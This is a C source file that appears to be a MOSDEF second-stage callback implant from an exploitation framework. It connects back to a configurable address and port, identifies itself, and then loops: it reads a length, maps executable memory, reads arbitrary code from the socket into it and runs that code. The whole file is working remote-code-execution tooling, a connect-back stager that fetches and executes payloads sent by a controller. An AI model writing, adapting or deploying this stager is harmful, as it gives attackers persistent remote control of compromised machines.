//
// code compiling with gcc and MOSDEF
//

#include <sys/socket.h>
#include <sys/mman.h>
#include <unistd.h>
#include <arpa/inet.h>

#ifdef __MOSDEF__
# include <mosdef/asm.h>
#endif

#ifdef __MOSDEF__
# define sizeof(struct sockaddr) 16
# define sizeof(len) 4
# define CAST(.*)
#else
# define callptr(ptr) ((void(*)())(ptr))()
# define CAST(cast) (cast)
#endif

#ifndef CBACK_ADDR
# define CBACK_ADDR 0x7f000001
#endif

#ifndef CBACK_PORT
# define CBACK_PORT 50000
#endif

#ifndef MOSDEF_TYPE
# define MOSDEF_TYPE 3
#endif

#ifndef MOSDEF_ID
# define MOSDEF_ID 1
#endif

int
tcpread(int fd, unsigned int size, unsigned char *buffer)
{
    unsigned int left;
    unsigned char *p;
    int i;

    left = size;
    p = buffer;
    
    do {
        i = read(fd, p, left);

        if (i <= 0) 
        {
            // error status is encoded in the syscall return value
            // TODO: parse it and take into account EINTR
            _exit(3);
        }
        
        left = left - i;
        p = p + i;

    } while (left > 0);

    return 1;
}


int
tcpwrite(int fd, unsigned int size, unsigned char *inbuffer)
{
    unsigned int left;
    int i;
    unsigned char *p;

    left = size;
    p = inbuffer;

    do {
        i = write(fd, p, left);
        
        if (i <= 0)
        {
            // error status is encoded in the syscall return value
            // TODO: parse it and take into account EINTR
            _exit(5);
        }
        
        left = left - i;
        p = p + i;

    } while (left > 0);

    return 1;
}


int
main(void)
{
    int ret;
    int len;
    int sock;
    struct sockaddr_storage ss;
    struct sockaddr_in *sin;
    struct sockaddr *sa;
    void *m;
    int i;
    int type;
    int id;

    sin = CAST(struct sockaddr_in *)&ss;
#ifdef __OSX__
    sin->sin_len = 16;
#endif
    sin->sin_family = AF_INET;
    sin->sin_port = htons(CBACK_PORT);
#ifdef __MOSDEF__
    sin->sin_addr_s_addr = htonl(CBACK_ADDR);
#else
    sin->sin_addr.s_addr = htonl(CBACK_ADDR);
#endif
    sa = CAST(struct sockaddr *)&ss;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        _exit(1);
    }

    len = sizeof(struct sockaddr);
    ret = connect(sock, sa, len);
    
    if (ret == -1) {
        _exit(2);
    }
	
    //send our MOSDEF type and ID
    type  = htonl(MOSDEF_TYPE);
    id    = htonl(MOSDEF_ID);

    tcpwrite(sock, 4, &type);
    tcpwrite(sock, 4, &id);    
    tcpread(sock, sizeof(len), &len);

   
#ifdef __OSX__
    m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
#else
    m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
#endif
    
    if (m == MAP_FAILED) {
        _exit(4);
    }

    // because our linux initial read_exec stub subs from readloc (which comes from pcloc)
    // we want to makes sure we have space above and blow our readloc, this to remain compatible
    // with stack adjusts etc. XXX: doing a cleaner workaround now ;)
    // XXX: this fixes dave bug, when running into similar issues, check this issue ;)
    // XXX: note that this only applies when running into any initial read_exec, our
    // XXX: read_and_exec_loop should be ok, as that switches over to it's own mmap
    // m = m + 0x2000;
    // XXX: this code originally had a little quirk in that it closed all the descriptors
    // XXX: and then assumed fd to be 0, instead of doing that, we just emulate the startup
    // XXX: stub as if we received and executed it, and send the fd on the wire

    // XXX: stage 1 emulation
    
    tcpread(sock, len, m);
    munmap(m, len);
    

# ifdef __SOLARIS_INTEL__
    i = 0;
    tcpwrite(sock, 4, &i); // emulate syscalltype .. defaults to int91
# endif

    tcpwrite(sock, 4, &sock);
    // XXX: end of stage 1 emulation
    // read len, and go into MOSDEF mode for real
    // loop this to deal with new school shellservers
    // that start their read_exec loop on the first send ..

    while(1)
    {
        tcpread(sock, sizeof(len), &len);

#ifdef __OSX__
        m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
#else
        m = mmap(0, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
#endif
    
        if (m == MAP_FAILED) {
            _exit(4);
        }
        
        tcpread(sock, len, m);

#ifdef __arm9__
        clearcache(m, m+len);
#endif
        
        callptr(m);
        munmap(m, len);
    }

    _exit(7);
    return 0;
}
